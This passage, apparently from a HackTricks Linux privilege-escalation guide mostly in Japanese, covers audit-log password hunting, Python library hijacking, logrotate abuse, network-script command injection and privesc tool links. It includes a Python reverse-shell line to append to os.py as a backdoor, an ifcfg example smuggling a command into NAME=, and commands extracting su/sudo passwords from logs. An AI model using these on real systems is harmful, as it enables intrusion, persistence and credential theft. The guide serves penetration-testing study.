また、一部の「**不適切に**」設定された（バックドア入り？）**監査ログ**は、監査ログ内に**パスワードを記録**させてしまう可能性があり、詳細はこの投稿で説明されています: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
ログを読むために、グループ [**adm**](interesting-groups-linux-pe/index.html#adm-group) は非常に役立ちます。

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

ファイル名（**name**）や内容（**content**）に「**password**」という単語が含まれているファイル、またログ内の IPs や emails、hashes regexps も確認するべきです。\
ここではこれらすべての方法を列挙しませんが、興味があれば [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) が行う最後のチェックを確認してください。

## 書き込み可能なファイル

### Python library hijacking

もし python スクリプトがどこから実行されるか（**where**）分かっていて、そのフォルダに**can write inside** できるか、または python ライブラリを**modify python libraries** できるなら、OS ライブラリを改変してバックドアを仕込むことができます（python スクリプトが実行される場所に書き込み可能なら、os.py library をコピー＆ペーストしてください）。

ライブラリを**backdoor the library**するには、os.py library の末尾に次の行を追加してください（IP と PORT を変更してください）:
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate の悪用

A vulnerability in `logrotate` lets users with **write permissions** on a log file or its parent directories potentially gain escalated privileges. This is because `logrotate`, often running as **root**, can be manipulated to execute arbitrary files, especially in directories like _**/etc/bash_completion.d/**_. It's important to check permissions not just in _/var/log_ but also in any directory where log rotation is applied.

> [!TIP]
> This vulnerability affects `logrotate` version `3.18.0` and older

More detailed information about the vulnerability can be found on this page: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

You can exploit this vulnerability with [**logrotten**](https://github.com/whotwagner/logrotten).

This vulnerability is very similar to [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** so whenever you find that you can alter logs, check who is managing those logs and check if you can escalate privileges substituting the logs by symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

何らかの理由でユーザーが `ifcf-<whatever>` スクリプトを _/etc/sysconfig/network-scripts_ に **書き込める**、または既存のスクリプトを **修正できる** 場合、your **system is pwned**。

Network scripts、例えば _ifcg-eth0_ はネットワーク接続に使われます。見た目は .INI ファイルと全く同じです。しかし、これらは Linux 上で Network Manager (dispatcher.d) によって \~sourced\~ されます。

私の場合、これらの network スクリプト中の `NAME=` 属性が正しく処理されていません。名前に **空白/ブランクスペースがあると、システムは空白の後ろの部分を実行しようとします**。つまり **最初の空白以降のすべてが root として実行されます**。

例えば: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_注: Network と /bin/id_ の間の空白に注意)

### **init, init.d, systemd, and rc.d**

ディレクトリ `/etc/init.d` は System V init (SysVinit) 用の **スクリプト** の格納場所です。クラシックな Linux サービス管理システムで、サービスを `start`、`stop`、`restart`、場合によっては `reload` するためのスクリプトが含まれます。これらは直接実行するか、`/etc/rc?.d/` にあるシンボリックリンク経由で実行できます。Redhat 系では代替パスとして `/etc/rc.d/init.d` があります。

一方、`/etc/init` は **Upstart** に関連しており、Ubuntu によって導入された新しい **サービス管理** で、サービス管理用の設定ファイルを使用します。Upstart への移行にもかかわらず、互換レイヤーにより SysVinit スクリプトは Upstart の設定と並行して引き続き利用されます。

**systemd** はモダンな初期化およびサービスマネージャとして登場し、オンデマンドでのデーモン起動、**自動マウント** の管理、システム状態のスナップショットなどの高度な機能を提供します。ファイルは配布パッケージ向けに `/usr/lib/systemd/`、管理者が変更するために `/etc/systemd/system/` に整理され、システム管理を簡素化します。

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks は一般に syscall をフックして特権カーネル機能をユーザ空間の manager に公開します。FD-order に基づく署名チェックや脆弱なパスワード方式などの弱い manager 認証により、ローカルアプリが manager を偽装して既に root 化されたデバイスで root に昇格できる可能性があります。詳細とエクスプロイトは以下を参照してください：


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations の regex 駆動の service discovery は、プロセスのコマンドラインからバイナリパスを抽出し、特権コンテキストで `-v` を付けて実行する可能性があります。許容的なパターン（例: `\S` を使用するなど）は、書き込み可能な場所（例: `/tmp/httpd`）に攻撃者が配置したリスナーとマッチし、root としての実行につながる可能性があります（CWE-426 Untrusted Search Path）。

学習および他の discovery/monitoring スタックにも適用できる一般化パターンの詳細は以下を参照してください：

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux と macOS のカーネル脆弱性を列挙 [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
